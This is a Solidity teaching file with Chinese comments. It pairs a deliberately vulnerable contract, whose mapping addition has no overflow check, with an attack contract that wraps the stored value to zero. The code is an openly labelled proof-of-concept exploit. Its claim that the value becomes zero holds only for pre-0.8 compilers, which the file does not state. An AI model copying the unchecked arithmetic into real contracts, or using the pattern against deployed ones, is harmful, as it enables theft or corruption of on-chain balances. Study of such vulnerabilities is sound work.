// 漏洞合約程式碼：Integer Overflow 脆弱性示範
// 此合約存在一個整數溢位漏洞，因為在 init 函式中執行 map[k] += v 時，沒有檢查加法是否溢位。

contract IntegerOverflowMappingSym1 {
    // 狀態變數：mapping 用於存放值，可能會累加導致 overflow
    mapping(uint256 => uint256) public map;
    
    // 漏洞函式：沒有檢查整數溢位的加法
    function init(uint256 k, uint256 v) public {
        map[k] += v; // 漏洞重點：缺少 overflow 保護
    }
}

// 攻擊合約，用於展示如何利用上述漏洞進行攻擊
contract AttackIntegerOverflow {
    IntegerOverflowMappingSym1 public vulnerableContract;

    // 部署時傳入被攻擊合約的地址
    constructor(address _vulnerableAddress) {
        vulnerableContract = IntegerOverflowMappingSym1(_vulnerableAddress);
    }

    // 攻擊函式：利用整數溢位漏洞
    // 攻擊步驟：
    // 1. 呼叫 vulnerableContract.init(1, type(uint256).max) 使 map[1] = 2**256 - 1
    // 2. 再呼叫 vulnerableContract.init(1, 1) 使得正確計算應為 2**256，但溢位後變成 0
    function attack() public {
        // 第一步：將 map[1] 的值設為上限 (2**256 - 1)
        vulnerableContract.init(1, type(uint256).max);
        
        // 第二步：觸發溢位，正確結果應該是 type(uint256).max + 1 = 2**256，但實際上會溢位變成 0
        vulnerableContract.init(1, 1);
    }

    // 攻擊後可讀取 vulnerableContract.map(1) 的值，看是否因溢位而變成 0
    function getOverflowedValue() public view returns (uint256) {
        return vulnerableContract.map(1);
    }
}
